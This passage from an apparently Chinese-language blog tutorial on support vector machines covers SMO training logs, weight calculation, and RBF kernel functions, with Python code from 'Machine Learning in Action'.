0 i:76, pairs changed 6</div><div class="line">fullSet, iter: 0 i:77, pairs changed 6</div><div class="line">fullSet, iter: 0 i:78, pairs changed 6</div><div class="line">fullSet, iter: 0 i:79, pairs changed 6</div><div class="line">fullSet, iter: 0 i:80, pairs changed 6</div><div class="line">fullSet, iter: 0 i:81, pairs changed 6</div><div class="line">fullSet, iter: 0 i:82, pairs changed 6</div><div class="line">fullSet, iter: 0 i:83, pairs changed 6</div><div class="line">fullSet, iter: 0 i:84, pairs changed 6</div><div class="line">fullSet, iter: 0 i:85, pairs changed 6</div><div class="line">fullSet, iter: 0 i:86, pairs changed 6</div><div class="line">fullSet, iter: 0 i:87, pairs changed 6</div><div class="line">fullSet, iter: 0 i:88, pairs changed 6</div><div class="line">fullSet, iter: 0 i:89, pairs changed 6</div><div class="line">fullSet, iter: 0 i:90, pairs changed 6</div><div class="line">fullSet, iter: 0 i:91, pairs changed 6</div><div class="line">fullSet, iter: 0 i:92, pairs changed 6</div><div class="line">fullSet, iter: 0 i:93, pairs changed 6</div><div class="line">fullSet, iter: 0 i:94, pairs changed 6</div><div class="line">fullSet, iter: 0 i:95, pairs changed 6</div><div class="line">fullSet, iter: 0 i:96, pairs changed 6</div><div class="line">fullSet, iter: 0 i:97, pairs changed 6</div><div class="line">fullSet, iter: 0 i:98, pairs changed 6</div><div class="line">fullSet, iter: 0 i:99, pairs changed 6</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:0, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:2, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:6, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:8, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">non-bound, iter: 1 i:23, pairs changed 0</div><div class="line">non-bound, iter: 1 i:52, pairs changed 0</div><div class="line">non-bound, iter: 1 i:54, pairs changed 0</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 2 i:0, pairs changed 0</div><div class="line">fullSet, iter: 2 i:1, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 2 i:2, pairs changed 0</div><div class="line">fullSet, iter: 2 i:3, pairs changed 0</div><div class="line">fullSet, iter: 2 i:4, pairs changed 0</div><div class="line">fullSet, iter: 2 i:5, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 2 i:6, pairs changed 0</div><div class="line">fullSet, iter: 2 i:7, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 2 i:8, pairs changed 0</div><div class="line">fullSet, iter: 2 i:9, pairs changed 0</div><div class="line">fullSet, iter: 2 i:10, pairs changed 0</div><div class="line">fullSet, iter: 2 i:11, pairs changed 0</div><div class="line">fullSet, iter: 2 i:12, pairs changed 0</div><div class="line">fullSet, iter: 2 i:13, pairs changed 0</div><div class="line">fullSet, iter: 2 i:14, pairs changed 0</div><div class="line">fullSet, iter: 2 i:15, pairs changed 0</div><div class="line">fullSet, iter: 2 i:16, pairs changed 0</div><div class="line">fullSet, iter: 2 i:17, pairs changed 0</div><div class="line">fullSet, iter: 2 i:18, pairs changed 0</div><div class="line">fullSet, iter: 2 i:19, pairs changed 0</div><div class="line">fullSet, iter: 2 i:20, pairs changed 0</div><div class="line">fullSet, iter: 2 i:21, pairs changed 0</div><div class="line">fullSet, iter: 2 i:22, pairs changed 0</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 2 i:23, pairs changed 0</div><div class="line">fullSet, iter: 2 i:24, pairs changed 0</div><div class="line">fullSet, iter: 2 i:25, pairs changed 0</div><div class="line">fullSet, iter: 2 i:26, pairs changed 0</div><div class="line">fullSet, iter: 2 i:27, pairs changed 0</div><div class="line">fullSet, iter: 2 i:28, pairs changed 0</div><div class="line">fullSet, iter: 2 i:29, pairs changed 0</div><div class="line">fullSet, iter: 2 i:30, pairs changed 0</div><div class="line">fullSet, iter: 2 i:31, pairs changed 0</div><div class="line">fullSet, iter: 2 i:32, pairs changed 0</div><div class="line">fullSet, iter: 2 i:33, pairs changed 0</div><div class="line">fullSet, iter: 2 i:34, pairs changed 0</div><div class="line">fullSet, iter: 2 i:35, pairs changed 0</div><div class="line">fullSet, iter: 2 i:36, pairs changed 0</div><div class="line">fullSet, iter: 2 i:37, pairs changed 0</div><div class="line">fullSet, iter: 2 i:38, pairs changed 0</div><div class="line">fullSet, iter: 2 i:39, pairs changed 0</div><div class="line">fullSet, iter: 2 i:40, pairs changed 0</div><div class="line">fullSet, iter: 2 i:41, pairs changed 0</div><div class="line">fullSet, iter: 2 i:42, pairs changed 0</div><div class="line">fullSet, iter: 2 i:43, pairs changed 0</div><div class="line">fullSet, iter: 2 i:44, pairs changed 0</div><div class="line">fullSet, iter: 2 i:45, pairs changed 0</div><div class="line">fullSet, iter: 2 i:46, pairs changed 0</div><div class="line">fullSet, iter: 2 i:47, pairs changed 0</div><div class="line">fullSet, iter: 2 i:48, pairs changed 0</div><div class="line">fullSet, iter: 2 i:49, pairs changed 0</div><div class="line">fullSet, iter: 2 i:50, pairs changed 0</div><div class="line">fullSet, iter: 2 i:51, pairs changed 0</div><div class="line">fullSet, iter: 2 i:52, pairs changed 0</div><div class="line">fullSet, iter: 2 i:53, pairs changed 0</div><div class="line">fullSet, iter: 2 i:54, pairs changed 0</div><div class="line">L==H</div><div class="line">fullSet, iter: 2 i:55, pairs changed 0</div><div class="line">fullSet, iter: 2 i:56, pairs changed 0</div><div class="line">fullSet, iter: 2 i:57, pairs changed 0</div><div class="line">fullSet, iter: 2 i:58, pairs changed 0</div><div class="line">fullSet, iter: 2 i:59, pairs changed 0</div><div class="line">fullSet, iter: 2 i:60, pairs changed 0</div><div class="line">fullSet, iter: 2 i:61, pairs changed 0</div><div class="line">fullSet, iter: 2 i:62, pairs changed 0</div><div class="line">fullSet, iter: 2 i:63, pairs changed 0</div><div class="line">fullSet, iter: 2 i:64, pairs changed 0</div><div class="line">fullSet, iter: 2 i:65, pairs changed 0</div><div class="line">fullSet, iter: 2 i:66, pairs changed 0</div><div class="line">fullSet, iter: 2 i:67, pairs changed 0</div><div class="line">fullSet, iter: 2 i:68, pairs changed 0</div><div class="line">fullSet, iter: 2 i:69, pairs changed 0</div><div class="line">fullSet, iter: 2 i:70, pairs changed 0</div><div class="line">fullSet, iter: 2 i:71, pairs changed 0</div><div class="line">fullSet, iter: 2 i:72, pairs changed 0</div><div class="line">fullSet, iter: 2 i:73, pairs changed 0</div><div class="line">fullSet, iter: 2 i:74, pairs changed 0</div><div class="line">fullSet, iter: 2 i:75, pairs changed 0</div><div class="line">fullSet, iter: 2 i:76, pairs changed 0</div><div class="line">fullSet, iter: 2 i:77, pairs changed 0</div><div class="line">fullSet, iter: 2 i:78, pairs changed 0</div><div class="line">fullSet, iter: 2 i:79, pairs changed 0</div><div class="line">fullSet, iter: 2 i:80, pairs changed 0</div><div class="line">fullSet, iter: 2 i:81, pairs changed 0</div><div class="line">fullSet, iter: 2 i:82, pairs changed 0</div><div class="line">fullSet, iter: 2 i:83, pairs changed 0</div><div class="line">fullSet, iter: 2 i:84, pairs changed 0</div><div class="line">fullSet, iter: 2 i:85, pairs changed 0</div><div class="line">fullSet, iter: 2 i:86, pairs changed 0</div><div class="line">fullSet, iter: 2 i:87, pairs changed 0</div><div class="line">fullSet, iter: 2 i:88, pairs changed 0</div><div class="line">fullSet, iter: 2 i:89, pairs changed 0</div><div class="line">fullSet, iter: 2 i:90, pairs changed 0</div><div class="line">fullSet, iter: 2 i:91, pairs changed 0</div><div class="line">fullSet, iter: 2 i:92, pairs changed 0</div><div class="line">fullSet, iter: 2 i:93, pairs changed 0</div><div class="line">fullSet, iter: 2 i:94, pairs changed 0</div><div class="line">fullSet, iter: 2 i:95, pairs changed 0</div><div class="line">fullSet, iter: 2 i:96, pairs changed 0</div><div class="line">fullSet, iter: 2 i:97, pairs changed 0</div><div class="line">fullSet, iter: 2 i:98, pairs changed 0</div><div class="line">fullSet, iter: 2 i:99, pairs changed 0</div><div class="line">iteration number: 3</div></pre></td></tr></table></figure></p>
<p>这样的结果更快。</p>
<p><img src="/wp-content/uploads/2016/07/support-vector-compelete.png" alt="support vector compelete"></p>
<p>图中画圈的支持向量就给出了满足算法的一种解。如果数据集非线性可分，就会发现支持向量会在超平面附近聚集成团。</p>
<p>刚才我们花了大量的时间来计算alpha值，但是如何利用它们进行分类呢？这不成问题，首先必须基于alpha得到超平面，这也包括了w的计算。下面列出的一个小函数可以用于实现上述任务：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcWs</span><span class="params">(alphas,dataArr,classLabels)</span>:</span></div><div class="line">    X = mat(dataArr); labelMat = mat(classLabels).transpose()</div><div class="line">    m,n = shape(X)</div><div class="line">    w = zeros((n,<span class="number">1</span>))</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</div><div class="line">        w += multiply(alphas[i]*labelMat[i],X[i,:].T)</div><div class="line">    <span class="keyword">return</span> w</div></pre></td></tr></table></figure></p>
<p>上述代码最重要的部分是for循环，虽然在循环中实现的只是多个数的乘积。前面计算出的任何一个<code>alpha</code>值，就不会忘记大部分alpha值为0.而非零<code>alpha</code>所对应的也就是支持向量。虽然上述for循环遍历了数据集中的所有数据，但是最终起作用的只有支持向量。由于对w计算毫无作用，所以数据中其他的数据点会被很容易舍弃。</p>
<p>为了使用前面给出的函数，输入下面的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; ws=svmMLiA.calcWs(alphas,dataArr,labelArr)</div><div class="line">&gt;&gt;&gt; ws</div><div class="line">array([[ 0.73660705],</div><div class="line">       [-0.33184906]])</div></pre></td></tr></table></figure></p>
<p>如果这个值大于0，则输入1类；如果这个值小于0，则属于-1类。对于数据点0，应该得到的类别标签是-1.可以通过如下的命令确定分类结果的正确性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; labelArr[0]</div><div class="line">-1.0</div></pre></td></tr></table></figure></p>
<p>这样我们可以成功的训练出分类器了，但是如果两类数据点分别分布在一个圆的内外部，那么会的到怎么样的分类面呢？</p>
<h1 id="在复杂数据上应用核函数"><a href="#在复杂数据上应用核函数" class="headerlink" title="在复杂数据上应用核函数"></a>在复杂数据上应用核函数</h1><p><img src="/wp-content/uploads/2016/07/complex_data.png" alt="complex_data"></p>
<p>我们现在就需要使用一种成为核函数（kernel）的工具将数据转换成易于分类器理解的形式。首先解释核函数的概念，并且介绍它们在支持向量自动机的使用方法，然后我们介绍一种成为径向基函数（radial basis function）的最流行的核函数。最终将这个核函数应用与我们前面得到的分类器。</p>
<h2 id="利用核函数将数据映射到高维空间"><a href="#利用核函数将数据映射到高维空间" class="headerlink" title="利用核函数将数据映射到高维空间"></a>利用核函数将数据映射到高维空间</h2><p>在上图中，数据点处于一个圆中，我们可以对圆中的数据进行转换，也就是把数据从一个特征空间转换到另一个特征空间，也就是一个映射。</p>
<p>从某个特征空间到另一个特征空间的映射会通过核函数来实现的，它能把数据从一个很难处理的形式转换成一个比较容易处理的形式，同时，核函数也有很多种类型，经过空间转换之后，我们就能够在高维空间解决线性问题，等价于在低维空间解决非线性问题。</p>
<p>SVM中，所有的运算都可以写成内积的形式，这样我们就可以把内积运算替换成核函数的形式。核函数不仅仅应用于支持向量自动机，很多其他机器学习算法也用到核函数。</p>
<h1 id="径向基核函数"><a href="#径向基核函数" class="headerlink" title="径向基核函数"></a>径向基核函数</h1><p>径向基函数是一个采用向量作为自变量的函数，能够基于向量距离运算输出一个标量。这个距离可以是从<0,0>向量或者其他向量开始计算的距离，其具体公式为：[k(x,y)=exp\left(\dfrac{-||x-y||^{2}}{2\sigma^{2}}\right)]，其中[\sigma]是我们定义的用于确认函数跌落到0的速度参数。</0,0></p>
<p>上述高斯函数核函数将数据映射至高维空间（具体来说是一个无穷远的空间）。可以在已有代码中使用核函数。首先我们输入函数kernelTrans()。然后对optStruct类进行修改，得到核转换函数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">kernelTrans</span><span class="params">(X, A, kTup)</span>:</span> <span class="comment">#calc the kernel or transform data to a higher dimensional space</span></div><div class="line">    m,n = shape(X)</div><div class="line">    K = mat(zeros((m,<span class="number">1</span>)))</div><div class="line">    <span class="keyword">if</span> kTup[<span class="number">0</span>]==<span class="string">'lin'</span>: K = X * A.T   <span class="comment">#linear kernel</span></div><div class="line">    <span class="keyword">elif</span> kTup[<span class="number">0</span>]==<span class="string">'rbf'</span>:</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(m):</div><div class="line">            deltaRow = X[j,:] - A</div><div class="line">            K[j] = deltaRow*deltaRow.T</div><div class="line">        K = exp(K/(<span class="number">-1</span>*kTup[<span class="number">1</span>]**<span class="number">2</span>)) <span class="comment">#divide in NumPy is element-wise not matrix like Matlab</span></div><div class="line">    <span class="keyword">else</span>: <span class="keyword">raise</span> NameError(<span class="string">'Houston We Have a Problem -- \</span></div><div class="line">    That Kernel is not recognized')</div><div class="line">    <span class="keyword">return</span> K</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">optStruct</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,dataMatIn, classLabels, C, toler, kTup)</span>:</span>  <span class="comment"># Initialize the structure with the parameters </span></div><div class="line">        self.X = dataMatIn</div><div class="line">        self.labelMat = classLabels</div><div class="line">        self.C = C</div><div class="line">        self.tol = toler</div><div class="line">        self.m = shape(dataMatIn)[<span class="number">0</span>]</div><div class="line">        self.alphas = mat(zeros((self.m,<span class="number">1</span>)))</div><div class="line">        self.b = <span class="number">0</span></div><div class="line">        self.eCache = mat(zeros((self.m,<span class="number">2</span>))) <span class="comment">#first column is valid flag</span></div><div class="line">        self.K = mat(zeros((self.m,self.m)))</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.m):</div><div class="line">            self.K[:,i] = kernelTrans(self.X, self.X[i,:], kTup)</div></pre></td></tr></table></figure></p>
<p><code>optStruct</code>除了引入一个新变量<code>kTup</code>外，该版本和原来的<code>optStruct</code>一模一样。<code>kTup</code>是一个包含核函数信息的元祖，在初始化方法结束的时候，矩阵K先被构建，然后再通过调用函数<code>kernelTrans()</code>进行填充。全局K值只需要计算一次。当需要使用核函数的时候，就能过对他进行调用，也节省了很多的冗余的计算开销。</p>
<p>当计算矩阵K时，这个过程多次调用了<code>kernelTrans()</code>。这个过程有三个输入参数：2个数值型变量和1个元祖。元祖<code>kTup</code>给出的是核函数的信息。元祖的第一个参数是描述所用核函数类型的字符串，其他2个参数则都是核函数可能需要的可选参数。这个函数首先构建了一个列向量，然后检查元祖来确定核函数的类型。</p>
<p>在线性核函数的情况下，内积计算在“所有数据集”和“数据集中的一行”这两个输入间展开。在径向基函数的情况下，在for循环中对于矩阵的每个元素计算高斯函数的值。而在for循环结束之后，我们将计算过程应用到整个向量上去。</p>
<p>于是我们要对<code>innerL</code>和<code>calcEk</code>函数进行修改<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcEk</span><span class="params">(oS, k)</span>:</span></div><div class="line">    fXk = float(multiply(oS.alphas,oS.labelMat).T*oS.K[:,k] + oS.b)</div><div class="line">    Ek = fXk - float(oS.labelMat[k])</div><div class="line">    <span class="keyword">return</span> Ek</div></pre></td></tr></table></figure></p>
<h2 id="测试中使用核函数"><a href="#测试中使用核函数" class="headerlink" title="测试中使用核函数"></a>测试中使用核函数</h2><p>接下来我们将构建一个对数据点进行有效分类的分类器，这个分类器使用了径向基函数。前面提到基函数有一个用户定义的$\sigma$。首先我们需要确定其大小，然后利用该核函数构建出一个分类器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">testRbf</span><span class="params">(k1=<span class="number">1.3</span>)</span>:</span></div><div class="line">    dataArr,labelArr = loadDataSet(<span class="string">'testSetRBF.txt'</span>)</div><div class="line">    b,alphas = smoP(dataArr, labelArr, <span class="number">200</span>, <span class="number">0.0001</span>, <span class="number">10000</span>, (<span class="string">'rbf'</span>, k1)) <span class="comment">#C=200 important</span></div><div class="line">    datMat=mat(dataArr); labelMat = mat(labelArr).transpose()</div><div class="line">    svInd=nonzero(alphas.A&gt;<span class="number">0</span>)[<span class="number">0</span>]</div><div class="line">    sVs=datMat[svInd] <span class="comment">#get matrix of only support vectors</span></div><div class="line">    labelSV = labelMat[svInd];</div><div class="line">    <span class="keyword">print</span> <span class="string">"there are %d Support Vectors"</span> % shape(sVs)[<span class="number">0</span>]</div><div class="line">    m,n = shape(datMat)</div><div class="line">    errorCount = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</div><div class="line">        kernelEval = kernelTrans(sVs,datMat[i,:],(<span class="string">'rbf'</span>, k1))</div><div class="line">        predict=kernelEval.T * multiply(labelSV,alphas[svInd]) + b</div><div class="line">        <span class="keyword">if</span> sign(predict)!=sign(labelArr[i]): errorCount += <span class="number">1</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"the training error rate is: %f"</span> % (float(errorCount)/m)</div><div class="line">    dataArr,labelArr = loadDataSet(<span class="string">'testSetRBF2.txt'</span>)</div><div class="line">    errorCount = <span class="number">0</span></div><div class="line">    datMat=mat(dataArr); labelMat = mat(labelArr).transpose()</div><div class="line">    m,n = shape(datMat)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</div><div class="line">        kernelEval = kernelTrans(sVs,datMat[i,:],(<span class="string">'rbf'</span>, k1))</div><div class="line">        predict=kernelEval.T * multiply(labelSV,alphas[svInd]) + b</div><div class="line">        <span class="keyword">if</span> sign(predict)!=sign(labelArr[i]): errorCount += <span class="number">1</span>    </div><div class="line">    <span class="keyword">print</span> <span class="string">"the test error rate is: %f"</span> % (float(errorCount)/m)</div></pre></td></tr></table></figure></p>
<p>上述代码只有一个可选的输入参数，这个输入参数是高斯径向基函数中的一个用户定义变量。整个代码主要是由以前定义的函数类型构成的。首先，程序从文件中读取输入数据集，然后在这些数据集上运行Platt SMO算法，其中核函数的类型为<strong>rbf</strong>。</p>
<p>整个代码最重要的就是for循环开始的两行，他们给出了如何利用核函数进行分类。首先利用结构初始化方法使用过的kernelTrans()函数，得到转换后的数据。然后，在使用之前的alpha以及类别标签求积。需要特别注意的是，在这几行代码中，是如何做到只需要支持向量数据就进行分类的。</p>
<p>与第一个for循环相比，第二个for循环仅仅只有数据集不同，后者采用的是测试数据集。可以输入下面的命令：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import svmMLiA</div><div class="line">&gt;&gt;&gt; svmMLiA.testRbf()</div></pre></td></tr></table></figure></p>
<p>这个是结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div></pre></td><td class="code"><pre><div class="line">fullSet, iter: 0 i:0, pairs changed 1</div><div class="line">fullSet, iter: 0 i:1, pairs changed 2</div><div class="line">fullSet, iter: 0 i:2, pairs changed 3</div><div class="line">fullSet, iter: 0 i:3, pairs changed 4</div><div class="line">fullSet, iter: 0 i:4, pairs changed 5</div><div class="line">fullSet, iter: 0 i:5, pairs changed 6</div><div class="line">fullSet, iter: 0 i:6, pairs changed 7</div><div class="line">fullSet, iter: 0 i:7, pairs changed 7</div><div class="line">fullSet, iter: 0 i:8, pairs changed 8</div><div class="line">fullSet, iter: 0 i:9, pairs changed 8</div><div class="line">fullSet, iter: 0 i:10, pairs changed 9</div><div class="line">fullSet, iter: 0 i:11, pairs changed 10</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 0 i:12, pairs changed 10</div><div class="line">fullSet, iter: 0 i:13, pairs changed 11</div><div class="line">fullSet, iter: 0 i:14, pairs changed 12</div><div class="line">fullSet, iter: 0 i:15, pairs changed 13</div><div class="line">fullSet, iter: 0 i:16, pairs changed 14</div><div class="line">fullSet, iter: 0 i:17, pairs changed 14</div><div class="line">fullSet, iter: 0 i:18, pairs changed 15</div><div class="line">fullSet, iter: 0 i:19, pairs changed 16</div><div class="line">fullSet, iter: 0 i:20, pairs changed 16</div><div class="line">fullSet, iter: 0 i:21, pairs changed 17</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 0 i:22, pairs changed 17</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 0 i:23, pairs changed 17</div><div class="line">fullSet, iter: 0 i:24, pairs changed 18</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 0 i:25, pairs changed 18</div><div class="line">fullSet, iter: 0 i:26, pairs changed 18</div><div class="line">fullSet, iter: 0 i:27, pairs changed 19</div><div class="line">fullSet, iter: 0 i:28, pairs changed 19</div><div class="line">fullSet, iter: 0 i:29, pairs changed 19</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 0 i:30, pairs changed 19</div><div class="line">fullSet, iter: 0 i:31, pairs changed 20</div><div class="line">fullSet, iter: 0 i:32, pairs changed 20</div><div class="line">fullSet, iter: 0 i:33, pairs changed 20</div><div class="line">fullSet, iter: 0 i:34, pairs changed 21</div><div class="line">fullSet, iter: 0 i:35, pairs changed 